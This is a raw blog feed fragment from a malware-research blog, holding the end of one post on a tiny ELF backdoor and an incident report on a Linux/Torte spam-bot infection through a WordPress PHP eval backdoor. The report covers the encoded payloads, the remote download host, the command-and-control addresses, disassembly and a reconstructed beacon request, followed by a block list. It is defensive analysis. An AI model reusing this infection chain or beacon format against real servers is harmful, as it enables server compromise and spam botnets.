list of customer. So, sorry for I can not be NICE for this \u003Cb\u003Esilly \u003C\/b\u003Emistakes. \u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EYou all can judge whether I was speaking TRUTH or not when advising friend about my analysis \u003Ca href=\"https:\/\/t.co\/84yxdogio6\"\u003Ehttps:\/\/t.co\/84yxdogio6\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/KkDUUDEyz7\"\u003Epic.twitter.com\/KkDUUDEyz7\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/695291879101890560\"\u003EFebruary 4, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-O6EmKw27Eso\/VrVNaD3ZkQI\/AAAAAAAAUYU\/9crkJzV5wlc\/s400\/2003.JPG\u003E\u003Cbr\u003EMay☩Lord always gives strength to those who can read codes, and reveal the truth as per it is.  \u003Cp\u003E\u003Ch2\u003EThe sample, epilogue \u0026 follow up\u003C\/h2\u003E \u003Cp\u003EThe sample is in Virus Total that can be accessed in here--\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/cb95458e646859b32a88ed9778a5f9c7500d2a81eae31f0f9d70fc6b10511634\/analysis\/1454487250\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003EI am also added the Shellshock Shellcode compiles malware to its thread in kernelmode [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3506\u0026p=27809#p27809\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E \u003Cp\u003EThe radare.org [\u003Ca href=\"http:\/\/radare.org\/r\/\"\u003Elink\u003C\/a\u003E] dev team is proven rock, by only reading this post they added feature to check the ip address [\u003Ca href=\"https:\/\/github.com\/radare\/radare2\/issues\/4067\"\u003Elink\u003C\/a\u003E] \u0026 also adding the \u003Ci\u003Esyscall table information\u003C\/i\u003E [\u003Ca href=\"https:\/\/github.com\/radare\/radare2\/issues\/4068#issuecomment-179180415\"\u003Elink\u003C\/a\u003E] for FreeBSD x86-32 on Linux ELF analysis purpose.\u003Cbr\u003EFor your information I use \u003Ci\u003Eradare\u003C\/i\u003E since \u003Ci\u003E\"radare\"\u003C\/i\u003E, was 1st version (used it since \/usr\/ports), and our team is the \"official\" (smile) user for so long[\u003Ca href=\"http:\/\/radare.today\/posts\/who-uses-r2\/\"\u003Elink\u003C\/a\u003E] w\/thank you, and keep on using it \u003Cb\u003Ehappily \u003C\/b\u003Ein all my beloved \u003Ci\u003EDemon\u003C\/i\u003E clusters[\u003Ca href=\"http:\/\/freebsd.org\"\u003Elink\u003C\/a\u003E]. Please support them with improvement reports!  \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E.\u003Ca href=\"https:\/\/twitter.com\/akochkov\"\u003E@akochkov\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/Maijin212\"\u003E@Maijin212\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/trufae\"\u003E@trufae\u003C\/a\u003E Okay guys, here\u0026#39;s my correction for the syscall table of \u003Ca href=\"https:\/\/twitter.com\/radareorg\"\u003E@radareorg\u003C\/a\u003E (pic) \u003Ca href=\"https:\/\/t.co\/nSquhLYSUz\"\u003Epic.twitter.com\/nSquhLYSUz\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/694845280571666432\"\u003EFebruary 3, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EThank you for your participating to the vote[\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/695230713025601536\"\u003Elink\u003C\/a\u003E] \u0026 feedback about to this post:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-_7QwT9EiC2U\/VrVKJq0enYI\/AAAAAAAAUYI\/Ny7B7m7NcqA\/s380\/2001.JPG\u003E \u003Cp\u003ENOTE: The follow up of this case will be posted in here. To be noted, there are few opcodes that might have slight different translation, please bear to some small miss (if any), and kindly inform about it, but I am sure the overall analysis is correct.  \u003Cp\u003E#MalwareMustDie! | \u003Ci\u003Eanalysis by @unixfreaxjp\u003C\/i\u003E \u003Ci\u003E\u003Cp\u003E\u003Cpre\u003E\u003Cbr \/\u003E\u003Cbr \/\u003E\"Then you will know the truth, and the truth will set you free.”\u003Cbr \/\u003E\u003Cbr \/\u003E☩John 8:32\u003Cbr \/\u003E\u003C\/pre\u003E\u003C\/i\u003E"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/1470586720159709174\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/02\/mmd-0051-2016-debungking-tiny-elf.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/1470586720159709174"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/1470586720159709174"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/02\/mmd-0051-2016-debungking-tiny-elf.html","title":"MMD-0051-2016 - Debunking a tiny ELF remote backdoor (shellcode shellshock part 2)"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-vJXABVefvYc\/VrH7SiU8mcI\/AAAAAAAAUV0\/W9HmlIk4pXk\/s72-c\/001.png","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-211810280814370279"},"published":{"$t":"2016-01-11T19:20:00.000-08:00"},"updated":{"$t":"2016-02-28T13:12:12.478-08:00"},"title":{"type":"text","$t":"MMD-0050-2016 - Incident report: ELF Linux\/Torte infection (in Wordpress)"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EThe indicator\u003C\/h2\u003E\u003Cp\u003E Several hours ago, it was detected a suspicious inbound access on a \u003Ci\u003EWordpress \u003C\/i\u003Esite with the below log:\u003Cbr\u003E\u003Ca href=https:\/\/lh3.googleusercontent.com\/-h9jmyqlt3_w\/VpQLW_qrc7I\/AAAAAAAAUPQ\/LHMGunEdy34\/s5132\/001.png\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-h9jmyqlt3_w\/VpQLW_qrc7I\/AAAAAAAAUPQ\/LHMGunEdy34\/s580\/001.png\u003E\u003C\/a\u003E(\u003Ci\u003EThank's for the hard work from Y\u003C\/i\u003E) \u003Cbr\u003EIt's an unusual traffic coming from the unusual source of ip address: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E37.139.47.183|37-139-47-183.clodo.ru.|56534 | 37.139.40.0\/21 | PIRIX-INET | RU | comfortel.pro | Comfortel Ltd.\u003Cbr \/\u003E62.76.41.190 |62-76-41-190.clodo.ru. |57010 | 62.76.40.0\/21  | CLODO      | RU | clodo.ru      | IT House Ltd\u003Cbr \/\u003E\u003C\/pre\u003E..the requests were aiming the \u003Ci\u003E\"uploaded\"\u003C\/i\u003E \u003Cb\u003Eindex.php\u003C\/b\u003E file in this Wordpress site, that contains malicious code:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-VRgXSdUghXI\/VpQO1Msb86I\/AAAAAAAAUPc\/W6uvCb2q-B4\/s5580\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-VRgXSdUghXI\/VpQO1Msb86I\/AAAAAAAAUPc\/W6uvCb2q-B4\/s580\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe PHP has two functions, depends on the sent parameter, either it will print the\u003Ci\u003E eval()\u003C\/i\u003E value of the remotely sent (likely obfuscated) data via HTTP (see the first condition), or the second option, will write the file with the data grabbed from the posted parameters.  \u003Cp\u003EFrom the sysadmin point of view, up to this step we know it's malicious and but we usually don't know what this is all about without web-searching here and there on these insufficient information, if we lucky maybe we can find the clue.. But in this case, the site's administrator is smart to manage a record of the inbound suspicious traffic for the session accessing the \u003Cb\u003Eindex.php\u003C\/b\u003E.   \u003Cp\u003EFrom its \u003Ci\u003Edata's part\u003C\/i\u003E we extracted and beautified the posted text as per follows, and the new adventure is started from here.. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-TsiPGsThSnA\/VpQRAc9C0BI\/AAAAAAAAUPo\/tUButIwpBGM\/s5120\/003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-TsiPGsThSnA\/VpQRAc9C0BI\/AAAAAAAAUPo\/tUButIwpBGM\/s580\/003.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIt's a sequence of base64 encoded blob of data as \u003Ci\u003Earrays\u003C\/i\u003E posted  as a form's parameter value to the \u003Cb\u003Eindex.php\u003C\/b\u003E file. Which is having an eval() value in it to be decoded in the \u003Cb\u003Eindex.php\u003C\/b\u003E as per explained above. Yes, there's no way an admin can see this malicious activity evidence unless the stream data is captured or recorded (or it's a bit out of context but maybe we can do a proactive research to find the tool set used in a CNC site that was being used post this attack).  \u003Cp\u003E\u003Ch2\u003EWhat is this?\u003C\/h2\u003E\u003Cp\u003E \u003Cp\u003EWhat is the data, and what is it for. Let's decode it one step further.  \u003Cp\u003EThe decoded results are as below; the first part: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-9r7RsLj5tP4\/VpQVAC1Y7XI\/AAAAAAAAUP0\/zasMYpArVXc\/s5120\/004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-9r7RsLj5tP4\/VpQVAC1Y7XI\/AAAAAAAAUP0\/zasMYpArVXc\/s580\/004.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe first data stored in $env variable is obviously another encoded base64 data, the rest is a PHP code. The comments in the picture explained it downloads remote file \u0026 targeting Linux system that can execute the shell command via PHP environment.   \u003Cp\u003EThe next part is: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-L4SndEGVydg\/VpQXUBWt2FI\/AAAAAAAAUQA\/RCJDf_pnEyM\/s6120\/005.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-L4SndEGVydg\/VpQXUBWt2FI\/AAAAAAAAUQA\/RCJDf_pnEyM\/s580\/005.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIn this part we can see the rest of the malicious process as per described in the picture's comment.\u003Cbr\u003EThe download hostname \u003Ci\u003E\u003Cb\u003Epages.touchpadz.com\u003C\/b\u003E\u003C\/i\u003E is resolved to below IP in RU network. \u003Cpre class=\"brush: asm\"\u003E62.76.186.235|62-76-186-235.clodo.ru.|57010 | 62.76.184.0\/21 | CLODO | RU | clodo.ru | IT House Ltd\u003C\/pre\u003E  \u003Cp\u003EThe point is, no trace for the downloaded file too since it will be deleted afterward. And, the shell execution is performed under environment of \u003Cb\u003E$env\u003C\/b\u003E. So what the \u003Cb\u003E$env\u003C\/b\u003E is? Let's decode it further: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-qEyc_WBkbLk\/VpQYz-Hix_I\/AAAAAAAAUQM\/SMwUyGYnTIw\/s6120\/006.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qEyc_WBkbLk\/VpQYz-Hix_I\/AAAAAAAAUQM\/SMwUyGYnTIw\/s580\/006.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EOkay we can see some obfuscation in tags, some strings that doesn't make any sense and we can see some short codes. This must mean something, and we need the decrypter logic for it.   \u003Cp\u003E\u003Ch2\u003EUsing ELF payload decrypter logic\u003C\/h2\u003E At this point it's time to see the payload downloaded for this threat, the \u003Cb\u003Ecrond32\u003C\/b\u003E and \u003Cb\u003Ecrond64\u003C\/b\u003E.  \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-T5WL4gZboyk\/VpQZ_qHaIBI\/AAAAAAAAUQY\/pzpO2XosLMY\/s6580\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-T5WL4gZboyk\/VpQZ_qHaIBI\/AAAAAAAAUQY\/pzpO2XosLMY\/s580\/007.png\u003E\u003C\/a\u003E\u003Cbr\u003EIt's up and alive, good. What are they?  \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-hPmisVPf944\/VpQa70Sv8sI\/AAAAAAAAUQg\/HpVSJOLRWm0\/s6580\/008.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-hPmisVPf944\/VpQa70Sv8sI\/AAAAAAAAUQg\/HpVSJOLRWm0\/s580\/008.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThese are ELF malware files. And obviously, the encoder logic must be in it. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-TQUvTO2NvsI\/VpQgP2FXFSI\/AAAAAAAAUQw\/lvx7Hqr_aUc\/s5580\/009.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-TQUvTO2NvsI\/VpQgP2FXFSI\/AAAAAAAAUQw\/lvx7Hqr_aUc\/s580\/009.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EApparently this ELF grabs XDVSN_SESSION_COOKIE value via \u003Ci\u003Esyscall\u003C\/i\u003E from the shell environment, so we are in the right track and.. trailing a bit further to find the decoder scheme: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-uXS9Ga0BeXo\/VpQsAPsZLqI\/AAAAAAAAURM\/4y3NudNkG6A\/s580\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-uXS9Ga0BeXo\/VpQsAPsZLqI\/AAAAAAAAURM\/4y3NudNkG6A\/s580\/011.png\u003E\u003C\/a\u003E\u003Cbr\u003ESo the decoded base64 is parsed to a xor function, with the key value:  \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-C8k3S99hckw\/VpQqIAqTpjI\/AAAAAAAAURA\/lFOBC2goabw\/s6580\/012.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-C8k3S99hckw\/VpQqIAqTpjI\/AAAAAAAAURA\/lFOBC2goabw\/s580\/012.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EKnowing this part is good for the next low level monitoring purpose, and this is the important part since the rest of the process of the ELF will rely on the result. Now we will know exactly what to do.  \u003Cp\u003E\u003Cb\u003E\u003Ci\u003EA note:\u003C\/i\u003E\u003C\/b\u003E I have \u003Ci\u003Eone habit\u003C\/i\u003E in analyzing ELF cases we handle, if I think we know and have full control to a malware, I tend to make a PoC as infection evidence by the method of: \u003Ci\u003E\"let's feed them with anything they want \u003Cb\u003Eto detonate\u003C\/b\u003E its malicious process\u003C\/i\u003E, this method is actually \u003Ci\u003Enot a good way to do for the beginners\u003C\/i\u003E, and in my case I reversed it well first to make it sure it is safe beforehand.  \u003Cp\u003EOkay, moving on, in this case the \u003Ci\u003Esimilar method above\u003C\/i\u003E was applied, and the parsed $XDVSN_SESSION_COOKIE is showing the below result:  \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-BJSzUZYFOPs\/VpQuq19Cn7I\/AAAAAAAAURY\/_fuyIPTpNJw\/s6120\/013.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-BJSzUZYFOPs\/VpQuq19Cn7I\/AAAAAAAAURY\/_fuyIPTpNJw\/s580\/013.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EYou can see the three more malicious URL under domain \u003Cb\u003E\u003Ci\u003Etouchpadz.com\u003C\/i\u003E\u003C\/b\u003E inside the blob of data above under the tag of \u003Cb\u003E＜lu＞, ＜bu＞ and ＜su＞\u003C\/b\u003E and there are other tags too. Those hostnames are pointing to one IP located in LeaseWeb network in North Holland: \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"5.79.83.27\",\u003Cbr \/\u003E  \"hostname\": \"hosted-by.leaseweb.com\",\u003Cbr \/\u003E  \"city\": \"Amsterdam\",\u003Cbr \/\u003E  \"region\": \"North Holland\",\u003Cbr \/\u003E  \"country\": \"NL\",\u003Cbr \/\u003E  \"loc\": \"52.3740,4.8897\",\u003Cbr \/\u003E  \"org\": \"AS60781 LeaseWeb Netherlands B.V.\",\u003Cbr \/\u003E  \"postal\": \"1000\"\u003C\/pre\u003E \u003Cp\u003EJust to make sure these tags means something and the decryption is correct, in this ELF binary must be spotted the exact handler for each tag keyword, I checked again the ELF's assembly for these keyword's variable allocation code: \u003Cbr\u003E\u003Ca href=https:\/\/lh3.googleusercontent.com\/-qhRst1Yfk5I\/VpQzWbxwp2I\/AAAAAAAAURk\/Oz3ySFxgKr0\/s4120\/014.PNG\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qhRst1Yfk5I\/VpQzWbxwp2I\/AAAAAAAAURk\/Oz3ySFxgKr0\/s580\/014.PNG\u003E\u003C\/a\u003E\u003Cbr\u003ENow we all can be sure the data is correct. In every tag there is a handler for each and this ELF is composing them to further bad action(s).   \u003Cp\u003E\u003Ch2\u003ERecognition of the Torte botnet threat\u003C\/h2\u003E\u003Cp\u003E \u003Cp\u003EAt this point our team remembered analysis of \u003Cb\u003E\u003Ci\u003ETorte Botnet\u003C\/i\u003E\u003C\/b\u003E published by Akamai researchers, you can view it here [\u003Ca href=\"https:\/\/www.stateoftheinternet.com\/downloads\/pdfs\/SpamBot-Investigation-whitepaper-R3.pdf\"\u003Elink\u003C\/a\u003E], and showing all of the infection indicators collected are matched. The report is having a lot of explanation of the overall threat scheme and the further ELF malware's work to interact with the CNC url to get more data to, in the end, send spams via SMTP connection which I also confirmed the same functions are found in this malware.   \u003Cp\u003E\u003Ci\u003E\u003Cb\u003EOkay, so what had happened here??\u003C\/b\u003E\u003C\/i\u003E \u003Cp\u003EAs for our incident case, it is an attempt to infect a Linux node to be part of the \u003Ci\u003ETorte Spam Botnet\u003C\/i\u003E with using ELF malware \u003Ci\u003E(called as \"Torte botnet spooler binary\" by Akamai ; to make it simple, alongside to other ELF malware binaries let's call it as \u003Cb\u003ELinux\/Torte\u003C\/b\u003E). \u003C\/i\u003E \u003Cp\u003EThe infection is cleverly done through a remote access interfaced by compromised Wordpress' uploaded PHP file, by a posted HTTP encoded data. And upon succeeded the threaded malware processes will run in the Linux server's memory without leaving much trace, except \u003Cb\u003E(1)a single index.php file\u003C\/b\u003E used in initial hack as the backdoor of infection, \u003Cb\u003E(2)the malicious process\u003C\/b\u003E and \u003Cb\u003E(3)several malicious environment variables\u003C\/b\u003E used.  \u003Cp\u003E\u003Ch2\u003EBehavior analysis\u003C\/h2\u003E \u003Cp\u003EIn a test bed the malware will initially load dynamic linker \u003Ci\u003Eld-2.13.so\u003C\/i\u003E to load its shared libs\/objects. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ZrfFCIY53pU\/VpRO_HUYHkI\/AAAAAAAAUSI\/pKM1_cIDRO4\/s6580\/016.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ZrfFCIY53pU\/VpRO_HUYHkI\/AAAAAAAAUSI\/pKM1_cIDRO4\/s580\/016.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIt then seeked and loaded the below list of its dependency libraries: \u003Cpre class=\"brush: asm\"\u003E\/etc\/ld.so.cache\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libcurl.so.4\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libstdc++.so.6\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libm.so.6\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/libgcc_s.so.1\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libc.so.6\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libpthread.so.0\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libidn.so.11\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libssh2.so.1\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/liblber-2.4.so.2\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libldap_r-2.4.so.2\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/librt.so.1\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libgssapi_krb5.so.2\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/i686\/cmov\/libssl.so.1.0.0\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/i686\/cmov\/libcrypto.so.1.0.0\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/librtmp.so.0\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/libz.so.1\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/libgcrypt.so.11\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libresolv.so.2\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libsasl2.so.2\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libgnutls.so.26\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libkrb5.so.3\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libk5crypto.so.3\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/libcom_err.so.2\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libkrb5support.so.0\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libdl.so.2\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/libkeyutils.so.1\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/libgpg-error.so.0\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libtasn1.so.3\u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/libp11-kit.so.0\u003C\/pre\u003E \u003Cp\u003ETo perform its malicious activities, this malware is utilizing shell environment as its place to store its variables. In an infected machine, the Linux environment variables will be modified (mostly added) to support this malicious scheme, this can be used as reference by sysadmins as indicator for this infection too.   \u003Cp\u003EBelow is the snapshot of the variables, please see the marked part. (There are also shell variables from web server's environment's too as \"noise\", please kindly bear with it). \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-qkOdUvdwROk\/VpQ-QMjDhaI\/AAAAAAAAUR4\/Cg1SeTRIYjc\/s6120\/015.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qkOdUvdwROk\/VpQ-QMjDhaI\/AAAAAAAAUR4\/Cg1SeTRIYjc\/s580\/015.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIn the marked entries you can see malware HTTP request variables.   \u003Cp\u003EThe ELF malware saved and run in infected system as threaded \u003Cb\u003E\"ps\"\u003C\/b\u003E processes. The original file was deleted right after the ELF malware is executed. If you use \u003Ci\u003Elist of files (lsof)\u003C\/i\u003E, this process will be shown as \u003Ci\u003E\u003Cb\u003E\"ps (deleted)\"\u003C\/b\u003E\u003C\/i\u003E. Again, the \u003Cb\u003Emalicious shell variables\u003C\/b\u003E and the \u003Cb\u003E\"ps (deleted\") process\u003C\/b\u003E is what mostly to be spotted in an infected system instead of the injected \u003Cb\u003Eindex.php\u003C\/b\u003E (or any name .php).  \u003Cp\u003ESo far there's no sign of any persistent effort for malware, i.e.: an autostart, to survive the reboot. It looks like the actor(s) wanted it to be that way for some reason. The deletion of the malicious \"ps\" processes, following by unset the malicious environment variables will cure the system, don't forget to delete the \u003Ci\u003Eindex.php\u003C\/i\u003E (the uploaded backdoor file) and patch the Wordpress flaw.  \u003Cp\u003E\u003Ch2\u003EBlock list\u003C\/h2\u003E \u003Cp\u003EIt is very recommendable to block this listed hostnames and IP addresses: \u003Cpre class=\"brush: asm\"\u003Esk2.touchpadz.com \u003Cbr \/\u003Estat.touchpadz.com \u003Cbr \/\u003Ebat.touchpadz.com\u003Cbr \/\u003Epages.touchpadz.com\u003Cbr \/\u003E5.79.83.27    (CNC backconnect source) \u003Cbr \/\u003E37.139.47.183 (wordpress attacker bot\/backdoor source)\u003Cbr \/\u003E62.76.41.190  (wordpress attacker bot\/backdoor source)\u003Cbr \/\u003E62.76.186.235 (malware download server)\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EOutbound traffic filtration note\u003C\/h2\u003E \u003Cp\u003EThis part is copy of the outbound traffic filtration plan I made in email for follow up. I think it is good for others to know too, so please bear the textual format.  \u003Cp\u003EThis threat, without traffic record, it's hard to analyze. But in the ELF is stated all we need to figure its outbound connection. Like access to GET request: \u003Cpre class=\"brush: asm\"\u003E[0x0804b280]\u003E pd @0x0804DE24  !222\u003Cbr \/\u003E0x0804de24      8d45d8         lea eax, [ebp-local_10]\u003Cbr \/\u003E0x0804de27      c74424080500.  mov dword [esp + 8], 5\u003Cbr \/\u003E0x0804de2f      c7442404f903.  mov dword [esp + 4], 0x80503f9 ; \"\/img\/\" \u003Cbr \/\u003E0x0804de37      890424         mov dword [esp], eax           ; noted the trailing \"\/\"\u003Cbr \/\u003E0x0804de3a      e859b1ffff     call sym.std::string::append\u003Cbr \/\u003E0x0804de3f      8d55d8         lea edx, [ebp-local_10]\u003Cbr \/\u003E0x0804de42      c74424080400.  mov dword [esp + 8], 4\u003Cbr \/\u003E0x0804de4a      c7442404ff03.  mov dword [esp + 4], 0x80503ff ; \"logo\"\u003Cbr \/\u003E0x0804de52      891424         mov dword [esp], edx\u003Cbr \/\u003E0x0804de55      e83eb1ffff     call sym.std::string::append\u003Cbr \/\u003E0x0804de5a      8d45d8         lea eax, [ebp-local_10]\u003Cbr \/\u003E0x0804de5d      c74424080400.  mov dword [esp + 8], 4\u003Cbr \/\u003E0x0804de65      c74424040404.  mov dword [esp + 4], 0x8050404 ; \".gif\"\u003Cbr \/\u003E0x0804de6d      890424         mov dword [esp], eax\u003Cbr \/\u003E0x0804de70      e823b1ffff     call sym.std::string::append\u003Cbr \/\u003E0x0804de75      8d55d8         lea edx, [ebp-local_10]\u003Cbr \/\u003E0x0804de78      c74424080700.  mov dword [esp + 8], 7\u003Cbr \/\u003E0x0804de80      c74424040904.  mov dword [esp + 4], 0x8050409 ; \"?sessd=\"\u003Cbr \/\u003E0x0804de88      891424         mov dword [esp], edx\u003Cbr \/\u003E0x0804de8b      e808b1ffff     call sym.std::string::append\u003Cbr \/\u003E\u003C\/pre\u003Eusing these parameters: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E[0x0804b280]\u003E pd @0x080503ff!55\u003Cbr \/\u003E    ;-- str._sessd_:\u003Cbr \/\u003E    ; DATA XREF from 0x0804de80 (unk)\u003Cbr \/\u003E            0x08050409 .string \"?sessd=\" ; len=8\u003Cbr \/\u003E    ;-- str._sessc_:\u003Cbr \/\u003E    ; DATA XREF from 0x0804dead (unk)\u003Cbr \/\u003E        |   0x08050411 .string \"\u0026sessc=\" ; len=8\u003Cbr \/\u003E    ;-- str._sessk_:\u003Cbr \/\u003E    ; DATA XREF from 0x0804df0d (unk)\u003Cbr \/\u003E       ||   0x08050419  string \"\u0026sessk=\" ; len=8\u003Cbr \/\u003E\u003C\/pre\u003Ealso it uses these user-agents: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E; DATA XREF from 0x0804cda3 (unk)\u003Cbr \/\u003E0x08050368     .string \"Mozilla\/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)\" ; len=58\u003Cbr \/\u003E0x080503a2      0000           add byte [eax], al\u003Cbr \/\u003E; DATA XREF from 0x0804cfd4 (unk)\u003Cbr \/\u003E0x080503a4     .string \"Mozilla\/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)\" ; len=58\u003Cbr \/\u003E\u003C\/pre\u003EUsing decrypted tags from $XDVSN_SESSION_COOKIE (see picture above), the used tags to be sent in HTTP\/1.1 with GET method by \u003Cb\u003ECThreadPool::httpGet\u003C\/b\u003E.i.e.: \"lt\" --\u003E \"sessc\" ; and \"sk\" --\u003E 2ssk\"; \"bu\"--\u003E\"Host:\" \u003Cpre class=\"brush: asm\"\u003E0x0804df5f      e89cedffff     call sym.CThreadPool::httpGet;\u003Cbr \/\u003Eesp=0x177ffc NULL; eip=0x804cd00 sym.CThreadPool::httpGet\u003Cbr \/\u003E\u003C\/pre\u003EComposing its GET request should came up to a HTTP GET commands like this: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EGET \/\/img\/loｇo.gif?seｓsd=xx\u0026seｓsc=100\u0026seｓsk=64537ｂ63727a28ｂ0 OR 226ｄ9b250f8aｄ270 [..]\u003Cbr 